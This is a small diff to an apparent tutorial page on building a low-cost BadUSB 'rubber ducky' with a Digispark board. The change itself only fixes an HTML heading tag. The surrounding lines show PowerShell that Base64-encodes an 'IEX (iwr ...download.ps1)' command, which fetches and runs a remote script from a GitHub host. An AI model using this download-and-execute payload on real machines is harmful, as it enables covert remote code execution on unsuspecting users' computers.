@@ -21,7 +21,7 @@ American Keyboard layout info<br><br>
 <p>https://digistump.com/wiki/digispark/tutorials/connecting<br>
 https://www.secjuice.com/how-to-build-a-low-cost-rubber-ducky/</p>
 
-<h3>Encode Base64 command:<h3>
+<h3>Encode Base64 command:</h3>
 <p>$String = "IEX (iwr 'https://raw.githubusercontent.com/helfiesp/Security/main/BadUSB/download.ps1')"<br>
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($String)<br>
 $encodedCommand = [System.Convert]::ToBase64String($bytes)<br>
